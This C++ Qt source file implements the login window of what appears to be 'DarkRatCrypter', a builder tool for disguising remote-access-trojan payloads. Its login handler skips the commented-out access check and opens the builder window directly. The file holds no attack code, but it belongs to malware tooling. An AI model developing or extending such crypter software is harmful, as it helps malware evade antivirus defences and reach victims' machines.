#include "loginUI.h"
#include "DarkRatCrypterUI.h"
#include <QtNetwork/QNetworkAccessManager>
#include "DarkRequest.h"
#include <QtWidgets\QMessageBox>
login::login(QWidget* parent) : QMainWindow(parent)
{
	ui.setupUi(this);



	//builder = new DarkRatCrypterUI(this);
	
	//QObject::connect(ui.btn_login, SIGNAL(click()), this, SLOT(openSecWindow()));
}




void login::on_btn_login_clicked()
{


	/*
	if (retrun == "access") {
		this->close();
		DarkRatCrypterUI* builder;
		builder = new DarkRatCrypterUI(this);
		builder->show();
	}
	else {
	
		QMessageBox msgBox;
		msgBox.setText("Name");
		msgBox.setInformativeText("Fuck!");
		msgBox.setStandardButtons(QMessageBox::Cancel);
		msgBox.setDefaultButton(QMessageBox::Cancel);
		int ret = msgBox.exec();
		
	}
	*/

	
		this->close();
	DarkRatCrypterUI* builder;
	builder = new DarkRatCrypterUI(this);
	builder->show();
	
	
	
}
